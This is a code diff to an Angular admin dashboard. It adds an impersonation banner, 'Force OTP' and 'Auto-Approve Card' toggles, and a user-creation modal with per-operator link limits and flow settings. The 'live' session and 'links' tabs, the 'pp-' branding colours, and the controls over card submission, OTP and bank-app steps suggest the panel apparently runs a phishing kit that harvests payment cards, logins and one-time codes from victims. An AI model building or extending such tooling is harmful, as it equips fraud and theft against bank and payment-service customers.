@@ -137,6 +137,19 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
       <!-- MAIN CONTENT -->
       <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg dark:bg-slate-900 overflow-hidden">
          
+         <!-- Impersonation Banner -->
+         @if (auth.currentUser()?.isImpersonated) {
+             <div class="bg-orange-500 text-white text-xs font-bold px-4 py-2 flex justify-between items-center z-50 shadow-md">
+                 <div class="flex items-center gap-2">
+                     <span class="material-icons text-sm animate-pulse">visibility</span>
+                     <span>IMPERSONATING: {{ auth.currentUser()?.username }}</span>
+                 </div>
+                 <button (click)="exitImpersonation()" class="bg-white/20 hover:bg-white/30 text-white px-3 py-1 rounded uppercase tracking-wider transition-colors flex items-center gap-1">
+                     <span class="material-icons text-xs">logout</span> Exit View
+                 </button>
+             </div>
+         }
+
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
              <div class="flex items-center gap-2">
@@ -927,6 +940,30 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                [class.translate-x-5]="flowSettings.forceBankApp" [class.translate-x-0]="!flowSettings.forceBankApp"></span>
                                      </div>
                                  </label>
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Force OTP</span>
+                                         <span class="text-xs text-slate-400">Require OTP even if App flow is selected</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.forceOtp" [class.bg-slate-200]="!flowSettings.forceOtp"
+                                          (click)="flowSettings.forceOtp = !flowSettings.forceOtp; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.forceOtp" [class.translate-x-0]="!flowSettings.forceOtp"></span>
+                                     </div>
+                                 </label>
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Auto-Approve Card</span>
+                                         <span class="text-xs text-slate-400">Automatically proceed after card submission</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.autoApproveCard" [class.bg-slate-200]="!flowSettings.autoApproveCard"
+                                          (click)="flowSettings.autoApproveCard = !flowSettings.autoApproveCard; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.autoApproveCard" [class.translate-x-0]="!flowSettings.autoApproveCard"></span>
+                                     </div>
+                                 </label>
                              </div>
                          </div>
 
@@ -1324,6 +1361,10 @@ export class AdminDashboardComponent {
   historyPanelOpen = signal(false);
   selectedHistorySession = signal<SessionHistory | null>(null);
 
+  // User Creation Modal Logic
+  userModalOpen = signal(false);
+  newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
+
   // Filters & Selection
   searchQuery = signal('');
   timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
@@ -1576,6 +1617,11 @@ export class AdminDashboardComponent {
       }
   }
 
+  exitImpersonation() {
+      this.auth.logout();
+      window.location.reload(); // Hard reload to clear state and return to login
+  }
+
   exitAdmin() {
       this.auth.logout();
       this.state.returnFromAdmin();
@@ -1695,20 +1741,21 @@ export class AdminDashboardComponent {
       } catch(e) {}
   }
 
-  async openAddUserModal() {
-      const username = await this.modal.prompt('Create User', 'Enter Username:', 'username');
-      if (!username) return;
-
-      const password = await this.modal.prompt('Create User', 'Enter Password:', 'password');
-      if (!password) return;
-
-      const isHypervisor = await this.modal.confirm('Role Selection', 'Is this user a Hypervisor?', 'confirm');
-      const role = isHypervisor ? 'hypervisor' : 'admin';
-
-      this.createUser(username, password, role);
+  openAddUserModal() {
+      this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
+      this.userModalOpen.set(true);
   }
 
-  async createUser(u: string, p: string, r: string) {
+  closeUserModal() {
+      this.userModalOpen.set(false);
+  }
+
+  async submitCreateUser() {
+      if (!this.newUser.username || !this.newUser.password) {
+          this.state.showAdminToast('Username and Password required');
+          return;
+      }
+
       try {
           const res = await fetch('/api/admin/users', {
               method: 'POST',
@@ -1716,13 +1763,24 @@ export class AdminDashboardComponent {
                   'Content-Type': 'application/json',
                   'Authorization': `Bearer ${this.auth.getToken()}`
               },
-              body: JSON.stringify({ username: u, password: p, role: r })
+              body: JSON.stringify({
+                  username: this.newUser.username,
+                  password: this.newUser.password,
+                  role: this.newUser.role,
+                  maxLinks: this.newUser.maxLinks,
+                  settings: this.newUser.flow
+              })
           });
           if (res.ok) {
               this.state.showAdminToast('User Created');
+              this.closeUserModal();
               this.fetchUsers();
+          } else {
+              this.state.showAdminToast('Failed to create user');
           }
-      } catch(e) {}
+      } catch(e) {
+          this.state.showAdminToast('Error creating user');
+      }
   }
 
   async deleteUser(user: any) {
